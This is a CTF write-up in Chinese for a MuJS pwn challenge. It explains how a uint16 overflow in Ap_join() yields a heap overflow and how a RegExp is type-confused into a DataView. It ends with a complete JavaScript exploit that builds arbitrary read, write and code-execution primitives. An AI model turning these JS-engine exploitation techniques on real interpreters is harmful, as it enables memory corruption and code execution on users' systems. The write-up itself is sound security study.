## Pwn

### mujs

> MuJS is a lightweight Javascript interpreter designed for embedding in other software to extend them with scripting capabilities.

可以想像成是一個輕量化的 `v8`, `spidermonkey` 等等 js engine，不過提供的 feature 沒有像 `v8` 這麼多。



該題的目標並非 get shell，而是透過找出 bug 來實作三個 primitives

- `read32(address)` - 任意讀 32 bits
- `write32(address, value)` - 任意寫 32 bits
- `exec(address)` - 執行 address 對應的 insn

由於 exploit 會丟給**五種不同的架構**跑，因此不能使用 library 提供的 primitive，只能使用 muJS 內部的 feature。

P.S. 在做這題之前，我花了一陣子看 mujs 內部的機制，因此對 mujs 已經有大概的了解後才來撰寫紀錄。



在 `README.md` 當中已經註明 bug 在 `Ap_join()`，這個 function 會在呼叫時 `list.join()` 被 trigger，而查看 patch 會發現程式碼大致相同，但是變數的宣告有些從 `int` 轉換成 `uint16_t`：

```diff
static void Ap_join(js_State *J)
{
	char * volatile out = NULL;
	const char *sep;
	const char *r;
	int seplen;
-	int k, n, len;
+	uint16_t k, n, len;

	len = js_getlength(J, 0); // get array length

	...

	n = 1;
	for (k = 0; k < len; ++k) {
		js_getindex(J, 0, k); // affected
		if (js_isundefined(J, -1) || js_isnull(J, -1))
			r = "";
		else
			r = js_tostring(J, -1); /* js_Value -> (js_String) JS_TMEMSTR */
		n += strlen(r); // first time n will be 0x8001, next time will be 0x10001 --> 0x1

		if (k == 0) {
			out = js_malloc(J, n);
			strcpy(out, r);
		} else {
			n += seplen;
			out = js_realloc(J, out, n); // e.g. n 0xffff + 0x2 ---> 0x1
			strcat(out, sep); // concat sep to 0x1 memory region --> heap overflow
			strcat(out, r);
		}

		js_pop(J, 1);
	}
	...
}
```

因為 uint16 type 的 value range 為 0~65535，當變數做為次數或是長度都是有可能會到 max，因此有 overflow 的可能性。

`k` 被用來當作 iterator，`n` 代表字串串接後的總長度，在 function 上半部分做一些 checking，沒什麼特別的，而在 function 下半部分會 traverse 傳入的 js array (實際上還是一個 `js_Object`)，並且以 `<list[0]><sep><list[1]>...` 的方式串接成一個字串。第一次 iteration (`k == 0`) 會分配一塊 memory 要串接的 string，而在之後的 iteration (`k == 1, k == 2, ...`) 會根據新的大小重新分配 memory，並且 concat sperator 以及下個 index 的 string。

想像當該次 iteration 結束時 `n` 為 65535 (0xffff)，但後續還有 element 沒有 concat。當下一個 iteration 時，`n` 會因為 `n += strlen(r)` 造成 overflow，在 `out = js_realloc(J, out, n)` 時會分配一個大小很小的 memory region，但是 `strcat(out, r)` 仍會把 context concat 到該 memory region 後面，若此時 context 大於新分配 memory region 的大小，就會造成 **heap overflow**。



在此 patch 當中不只修改了 `Ap_join()` 的實作，還增加一種 object type 為 `DataView`，以及自己實作的 slab allocation 機制。`DataView` object 的 prototype 如下：

```c
void jsB_initdataview(js_State *J)
{
	js_pushobject(J, J->DataView_prototype);
	{
		jsB_propf(J, "DataView.prototype.getUint8", Dv_getUint8, 1);
		jsB_propf(J, "DataView.prototype.setUint8", Dv_setUint8, 2); /* 2 parameters */
		jsB_propf(J, "DataView.prototype.getUint16", Dv_getUint16, 1);
		jsB_propf(J, "DataView.prototype.setUint16", Dv_setUint16, 2);
		jsB_propf(J, "DataView.prototype.getUint32", Dv_getUint32, 1);
		jsB_propf(J, "DataView.prototype.setUint32", Dv_setUint32, 2);
		jsB_propf(J, "DataView.prototype.getLength", Dv_getLength, 0);
	}
	js_newcconstructor(J, jsB_new_DataView, jsB_new_DataView, "DataView", 0);
	js_defglobal(J, "DataView", JS_DONTENUM);
}
```

Mujs 本身並未提供如 `ArrayBuffer` 功能的 class，而此 `DataView` 即可看成 `ArrayBuffer` 的實作，主要的 built-in function 即是提供不同 type 的 setter 以及 getter，淺顯易懂。

而 slab allocation 會把不同大小區間的 memory region 放到 pre-allocate 的記憶體空間當中 (稱作為 **zone**)，可以容納的大小為 `0x100000 / allocation_size`：

```c
void initialize_allocator() {
	zones[0].allocation_size = 0x10;
	zones[0].limit = 0x100000;

	zones[1].allocation_size = 0x30;
	zones[1].limit = 0x100000;

	zones[2].allocation_size = 0x80;
	zones[2].limit = 0x100000;

	zones[3].allocation_size = 0x100;
	zones[3].limit = 0x100000;

	zones[4].allocation_size = 0x200;
	zones[4].limit = 0x100000;

	zones[5].allocation_size = 0x400;
	zones[5].limit = 0x100000;

	zones[6].allocation_size = 0x800;
	zones[6].limit = 0x100000;

	for (int i = 0; i < NUM_ZONES; i++) {
		zones[i].base = mmap_memory_for_zone(zones[i].limit);
		free_list_t* prev = NULL;
		for (int j = 0; j < zones[i].limit / zones[i].allocation_size; j++) {
			free_list_t* curr = (free_list_t*)(zones[i].base + (zones[i].allocation_size * j));
			curr->next = prev;
			prev = curr;
		}
		zones[i].free_list_head = prev;
	}
}
```

如果 zone 沒有多的空間，就直接用原生的 `malloc()`：

```c
void* my_malloc(int size) {
	for (int i = 0; i < NUM_ZONES; i++) {
		/* memory size <= zone allocation size */
		if (size <= zones[i].allocation_size) {
			/* no more free slot */
			if (zones[i].free_list_head == NULL) {
				fprintf(stderr, "Memory exhausted.");
				exit(1);
			}
			/* get slot at free list head */
			free_list_t* result = zones[i].free_list_head;
			return result;
		}
	}

	void* real_result = malloc(size+8);
	*(uint64_t*)real_result = size; /* first 8 bytes save size */
	return real_result + 8;
}
```

如果要釋放記憶體，則會檢查是否該 memory 在 zone 當中，如果不是的話使用原生的 `free()`，而如果是的話就加回去 free_list。而 slab allocation 似乎都會**連續的分配記憶體**，並從**高記憶體位置的 chunk 拿到低的記憶體位址**，而其中也沒有像 glibc chunk 的那種 metadata，因此適合做為 victim 儲存的位置。



而因為 `DataView` 提供了兩個 powerful 的功能：`getUint` 以及 `setUint`，如果能控制到 `DataView` object 的話就可以 overwrite `DataView.length`，做到 OOB，但是 `js_Object` 在覆蓋其 union 前會蓋到其他重要的 attribute，會導致程式 crash：

```c
struct js_Object
{
	enum js_Class type;
	int extensible;
	js_Property *properties;
	int count; /* number of properties, for array sparseness check */
	js_Object *prototype;
	union {
        ...
		/* new object union */
		struct {
		    uint32_t length;
		    uint8_t* data;
		} dataview; /* act as array buffer in other js engine */
	} u;
    ...
};
```

如 `type`, `properties` 等等會被蓋掉，因此不是一條可行的做法，不過 `js_Class type` 前面並沒有任何 member，因此是可以被控制的。如果我們能透過將其他 object 的  `type` 蓋成 `DataView`，並且資料能正常對應，是否有辦法能讓原本 type 的資料在轉成 `DataView.length` 時會是一個很大的值？ 

此時觀察不同 type object 使用到的資料，會發現只有 `user` 以及 `jsRegexp` 的前兩個 element 都是 pointer，並且第二個 pointer 都是 string pointer：

```c
struct {
    const char *tag;
    void *data;
    js_HasProperty has;
    js_Put put;
    js_Delete delete;
	js_Finalize finalize;
} user;
/* new object union */
struct {
	uint32_t length;
	uint8_t* data;
} dataview; /* act as array buffer in other js engine */

struct jsRegexp {
	void *prog;
	char *source;
	unsigned short flags;
	unsigned short last;
};
```

當第一個 element 是 pointer，`dataview.length` 就會是一個很大的數，因此可以做到 OOB。

而這兩個該如何選擇？在 documentation 當中 (`reference.html`) 有註明：

>Objects with the userdata class are provided to allow arbitrary C data to be attached to Javascript objects.
>
>A userdata object has a pointer to a block of raw memory, which is managed by the host.
>
>Userdata values cannot be created or modified in Javascript, only through the C API.
>
>This guarantees the integrity of data owned by the host program.

userdata 是 C API，並不能透過 js engine 來做使用，因此在此選擇 `Regexp` 作為我們的目標。思路大致如下：

- 建立一連續記憶體區塊，最後為兩個 object (`list` 以及 `Regexp`)，regexp_obj 會是最一開始被 allocate (在最高，可以被 overwrite)
- 透過控制 list_obj 以及 `Ap_join()` 的 vuln，蓋寫 regexp_obj 的 class 成 `DataView` 達到 OOB access

然而這個 OOB 的條件十分嚴苛，只能讀取其後面的記憶體位置，因此我們必須在建立一個 `DataView` obj，並透過構造的 fake `DataView` 來蓋寫第二個 `DataView` 的 `data` element，配合 `setUint32()` 以及 `getUint32()` 就能做到 arbitrary read / write。



有了 AAR / AAW，要任意執行應該存在多種方式，不過這邊選擇的是比較複雜的方式。

object 的 property (`js_Property`) 會根據指向的 `js_Object` 有不同的 operation，我們可以先在能控制到的地方建構一個 fake `js_Property`，再透過蓋寫其他 object 的 property pointer 來 hijack property，控制其行為。

而後，我們的目標需要做 function call，而當執行如 `obj.property` 時，會透過 property 的  `getter` 取得 property 的資訊， `getter` 本身也是一個 `js_Object`，如果能改寫 `getter`  pointer 到，下方可控的位置，就能任意控制 `obj.property` 時的行為。當 `js_Object` type 為 `JS_CCFUNCTION`，這樣就會在 `js_call()` 時直接呼叫 natvie C function，也就是 `u.c.function` 指向的 address：

```c
void js_call(js_State *J, int n)
{
	...
	} else if (obj->type == JS_CCFUNCTION) {
		jsR_pushtrace(J, obj->u.c.name, "native", 0);
		jsR_callcfunction(J, n, obj->u.c.length, obj->u.c.function);
		--J->tracetop;
	}
	...
}
```

```c
static void jsR_callcfunction(js_State *J, int n, int min, js_CFunction F)
{
	...
	F(J); // <----- here
	v = *stackidx(J, -1);
	TOP = --BOT; /* clear stack */
	js_pushvalue(J, v);
}
```

步驟為：

- 在可控處 A 構造 property，將 property 的 `getter` 指向可控處 B，並且為 property 取一個名字 (e.g. `trigger`)
-  `getter` 指到的部分會是一個 `js_Object`，控制 type 為 `JS_CCFUNCTION`，`u.c.function` 為指定要執行的 address
- 蓋掉某 object 的 property 成第一步所構造的 property (可控處 A)，並執行 `obj.trigger`



exploit:

```js
var STR = [];
var cnt = 1;
STR[cnt] = 'P';
/* STR[1] = 'q' ; [2] = 'qq' ; [4] = 'qqqq' ... */
for (var i = 0; i < 16 ; i++) {
    STR[cnt*2] = STR[cnt] + STR[cnt];
    cnt *= 2;
}

function u64(s) {
    var num = 0;
    for (var i = 7; i >= 0; i--) {
        num *= 256;
        num += s.charCodeAt(i);
    }
    return num;
}

// js_Object size 0x68
// 0x11 == JS_CDATAVIEW
// 0x80 - for allocation memory
// 0x40 - for RegExp source string
var overflow = [ STR[0x10000].slice(0x81+0x1), STR[0x80] + STR[0x40] + '\x11'];
/* default --> 0x1
 * [0] --> 0xff7e (0x10000 - 0x82) (total: 0xff7f)
 * [1] --> 0x80 + 0x40 + 0x1 (total: 0x40)
 *
 * first time will use malloc(65407 + 8)
 * second time will realloc(J, out, 0x40) --> my_malloc(0x40) --> get ptr
 * from free_list_head (0x800)
 */

/* the slab allocation is from high address to low address */
var spray = [];
for (var i = 0; i < 1000; i++)
    spray.push(STR[0x40]);
/*
| Ap_join | (0x80)
| _______ |
|  regstr | (0x80) RexExp Str
| _______ |
|  master | (0x80) RegExp
| _______ |
|  slave  | (0x80) DataView
| _______ |

Why use master / slave?
--> we can use master to edit slave, and use slave to access arbitary address
*/
var slave = DataView(8);
slave.getUint8(0);
var master = RegExp(STR[0x40]);

// join() will create a memory region
/* first will copy 0x40 (overflow value) to new buffer,
 * next will strcat STR[0x80] STR[0x40] '\x11' to new buffer, (0x80+0x40+1 == 0xc1)
 */
overflow.join(""); /* "" instead use "," (len = 1) */

master.edit = DataView.prototype.setUint32;
master.show = DataView.prototype.getUint32;


function read32(addr) {
    master.edit(0x12c, addr / 0x100000000);
    master.edit(0x128, addr % 0x100000000);
    return slave.getUint32(0);
}

function write32(addr, value) {
    master.edit(0x12c, addr / 0x100000000);
    master.edit(0x128, addr % 0x100000000);
    return slave.setUint32(0, value);
}

function read64(addr) {
    return read32(addr) + read32(addr+4) * 0x100000000;
}

function write64(addr, val) {
    write32(addr, val % 0x100000000);
    write32(addr + 4, val / 0x100000000);
}

function exec(addr) {
    // (reg str) 0xe80 ~ (slave.u.dataview.data) 0xfa8 == 296 == 0x128
    var orig_slave_data = master.show(0x128) + master.show(0x12c)*0x100000000;
    var orig_slave_property = master.show(0x108) + master.show(0x10c) * 0x100000000;
    var target_property = master.show(0xa8) + master.show(0xac) * 0x100000000;
    // use data to create fake property

    /*
    ** fake_property start from data **
    const char *name; // 0-7
    js_Property *left, *right; // 8-f, 10-17
    int level; // 18-1b
    int atts; // 1c-1f
    js_Value value; // 20 - 2f
    js_Object *getter; // 30 - 37
    js_Object *setter; // 38 - 3f
    */
    write64(target_property, target_property + 0x10);
    write64(target_property + 0x10, u64("trigger\x00")); // fake property name
    write64(target_property + 0x30, target_property + 0x40); // fake getter
    
    write32(target_property + 0x40, 0x5); // 0x5 == JS_CCFUNCTION
    write64(target_property + 0x68, addr); // our target function (c.function)
    write64(target_property + 0x78, 0); // gcnext --> NULL

    // change slave property
    master.edit(0x108, target_property % 0x100000000);
    master.edit(0x10c, target_property / 0x100000000);

    slave.trigger;
    
    // restore property
    master.edit(0x108, orig_slave_property % 0x100000000);
    master.edit(0x10c, orig_slave_property / 0x100000000);
    print(target_property);
}
```



#### reference

- [Jwang 的 writeup](https://hackmd.io/@M30W/UIUCTF2020-MuJS-Writeup#0x00-gt-Table-of-Contents)
- [ptr-yudai](https://ptr-yudai.hatenablog.com/entry/2020/07/20/153619#Pwn-MuJS) (還沒看)



相似的題目還有：

- [0CTF oneline JS](https://kylebot.net/2020/07/03/0CTF-2020-Quals-One-Line-JS/)